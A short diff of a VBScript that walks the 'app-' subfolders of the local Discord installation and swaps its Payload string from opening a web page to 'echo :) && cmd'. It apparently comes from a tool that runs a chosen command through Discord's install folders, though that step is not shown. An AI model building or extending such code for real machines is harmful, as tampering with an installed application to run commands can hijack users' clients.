@@ -3,7 +3,7 @@ Set Shell = CreateObject("WScript.Shell")
 Set App = CreateObject("Shell.Application")
 
 Discord = Shell.expandEnvironmentStrings("%localappdata%") + "\Discord\"
-Payload = "start https://http.cat/200"
+Payload = "echo :) && cmd"
 
 For Each Item in FSO.GetFolder(Discord).SubFolders
   if InStr(1, Item.Name, "app-") = 1 Then
